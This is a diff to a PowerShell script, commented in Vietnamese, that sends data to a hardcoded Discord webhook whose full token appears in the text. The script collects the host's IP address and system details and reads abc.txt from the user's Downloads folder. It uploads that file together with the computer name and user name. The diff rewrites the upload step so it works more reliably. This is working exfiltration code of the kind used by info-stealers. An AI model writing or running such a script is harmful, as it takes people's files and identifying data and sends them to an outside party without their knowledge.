@@ -1,20 +1,24 @@
+# === CẤU HÌNH ===
 $webhookUrl = "https://discord.com/api/webhooks/1487286624411848855/zpDppnQHhm7BJ1BNIm_0zvZNWph8r725gO5SpFTWr9-otXf3uKLvMZ3StJjksTxyU412"
 
 # --- Test webhook ---
 $test = @{ content = "Test message" } | ConvertTo-Json
 try {
     Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $test -ContentType "application/json"
-    Write-Host "[+] Webhook test OK"
+    Write-Host "[+] Webhook test OK" -ForegroundColor Green
 } catch {
-    Write-Host "[-] Webhook test failed: $_"
+    Write-Host "[-] Webhook test failed: $_" -ForegroundColor Red
     exit
 }
 
 # --- Lấy IP (fallback) ---
 try {
     $ipAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" }).IPAddress[0]
+    Write-Host "[*] IP via Get-NetIPAddress: $ipAddress"
 } catch {
+    Write-Host "[!] Get-NetIPAddress failed, falling back to WMI..."
     $ipAddress = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -and $_.IPAddress -ne $null }).IPAddress[0]
+    Write-Host "[*] IP via WMI: $ipAddress"
 }
 
 # --- Gửi embed thông tin ---
@@ -34,78 +38,68 @@ $embedHash = @{
 }
 try {
     Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($embedHash | ConvertTo-Json -Depth 5) -ContentType "application/json"
-    Write-Host "[+] Embed sent"
+    Write-Host "[+] Embed sent" -ForegroundColor Green
 } catch {
-    Write-Host "[-] Embed failed: $_"
+    Write-Host "[-] Embed failed: $_" -ForegroundColor Red
 }
 
-# --- Gửi file abc.txt với đúng multipart format ---
+# --- Gửi file abc.txt với code đã hoạt động ---
 $filePath = Join-Path ([Environment]::GetFolderPath('UserProfile')) "Downloads\abc.txt"
 Write-Host "[*] Checking file at: $filePath"
 
-# Kiểm tra file tồn tại trước
 if (Test-Path $filePath) {
-    Write-Host "[*] File found. Size: $((Get-Item $filePath).Length) bytes"
+    $fileSize = (Get-Item $filePath).Length
+    Write-Host "[*] File found. Size: $fileSize bytes" -ForegroundColor Cyan
 
-    # Tạo multipart/form-data bằng Invoke-RestMethod (nếu PowerShell 6+)
-    # Nhưng để tương thích với PowerShell 5.1, ta dùng .NET
+    # Đảm bảo nạp thư viện .NET cần thiết (nếu chưa có)
+    Add-Type -AssemblyName System.Net.Http -ErrorAction SilentlyContinue
+
     try {
-        # Tạo boundary ngẫu nhiên
-        $boundary = [System.Guid]::NewGuid().ToString()
-        $contentType = "multipart/form-data; boundary=$boundary"
-        
-        # Tạo nội dung multipart thủ công (an toàn, không phụ thuộc .NET HttpClient)
-        $LF = "`r`n"
-        $bodyLines = @()
-        
-        # Part 1: payload_json
-        $payloadJson = @{
-            content = "File attached from $env:COMPUTERNAME"
-            attachments = @(
-                @{
-                    id = 0
-                    filename = "abc.txt"
-                }
-            )
-        } | ConvertTo-Json
-        
-        $bodyLines += "--$boundary"
-        $bodyLines += "Content-Disposition: form-data; name=`"payload_json`""
-        $bodyLines += "Content-Type: application/json"
-        $bodyLines += ""
-        $bodyLines += $payloadJson
-        
-        # Part 2: file (files[0])
-        $bodyLines += "--$boundary"
-        $bodyLines += "Content-Disposition: form-data; name=`"files[0]`"; filename=`"abc.txt`""
-        $bodyLines += "Content-Type: application/octet-stream"
-        $bodyLines += ""
-        
-        # Đọc file nhị phân
+        # Khởi tạo HttpClient và MultipartFormDataContent
+        $httpClient = [System.Net.Http.HttpClient]::new()
+        $multipartContent = [System.Net.Http.MultipartFormDataContent]::new()
+
+        # Đọc file dưới dạng mảng byte
         $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
+        $fileContent = [System.Net.Http.ByteArrayContent]::new($fileBytes)
+        $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
         
-        # Kết hợp tất cả thành một mảng byte
-        $encoding = [System.Text.Encoding]::UTF8
-        $headerBytes = $encoding.GetBytes(($bodyLines -join $LF) + $LF)
-        $footerBytes = $encoding.GetBytes("$LF--$boundary--$LF")
-        
-        $allBytes = $headerBytes + $fileBytes + $footerBytes
-        
-        # Gửi request bằng Invoke-RestMethod với dữ liệu thô
-        Write-Host "[*] Uploading file (size: $($allBytes.Length) bytes)..."
-        $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $allBytes -ContentType $contentType
-        
-        Write-Host "[+] File uploaded successfully! Response: $($response | ConvertTo-Json)"
-    } catch {
-        Write-Host "[-] Upload failed: $($_.Exception.Message)"
-        if ($_.Exception.Response) {
-            $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
-            $reader.BaseStream.Position = 0
-            $reader.DiscardBufferedData()
-            $responseBody = $reader.ReadToEnd()
-            Write-Host "[-] Discord response: $responseBody"
+        # Thêm file vào multipart với key "file" (Discord yêu cầu)
+        $multipartContent.Add($fileContent, "file", "abc.txt")
+        Write-Host "[*] Added file part with key 'file'" -ForegroundColor Gray
+
+        # Thêm tin nhắn văn bản kèm theo (tùy chọn)
+        $messageText = "Dữ liệu từ máy: $env:COMPUTERNAME - $env:USERNAME"
+        $stringContent = [System.Net.Http.StringContent]::new($messageText)
+        $multipartContent.Add($stringContent, "content")
+        Write-Host "[*] Added message part with content: '$messageText'" -ForegroundColor Gray
+
+        # Gửi POST request
+        Write-Host "[*] Uploading file to Discord..." -ForegroundColor Yellow
+        $response = $httpClient.PostAsync($webhookUrl, $multipartContent).Result
+
+        if ($response.IsSuccessStatusCode) {
+            Write-Host "[+] File uploaded successfully!" -ForegroundColor Green
+            # Đọc response (thường là rỗng)
+            $responseBody = $response.Content.ReadAsStringAsync().Result
+            if ($responseBody) {
+                Write-Host "[*] Discord response: $responseBody" -ForegroundColor DarkGray
+            }
+        } else {
+            $errorBody = $response.Content.ReadAsStringAsync().Result
+            Write-Host "[-] Discord returned error: $($response.StatusCode) - $errorBody" -ForegroundColor Red
         }
+    } catch {
+        Write-Host "[-] Exception during upload: $($_.Exception.Message)" -ForegroundColor Red
+        if ($_.Exception.InnerException) {
+            Write-Host "    Inner: $($_.Exception.InnerException.Message)" -ForegroundColor Red
+        }
+    } finally {
+        # Giải phóng tài nguyên
+        if ($httpClient) { $httpClient.Dispose() }
+        if ($multipartContent) { $multipartContent.Dispose() }
+        Write-Host "[*] Cleanup completed." -ForegroundColor Gray
     }
 } else {
-    Write-Host "[!] File not found at $filePath"
+    Write-Host "[!] File not found at $filePath" -ForegroundColor Red
 }
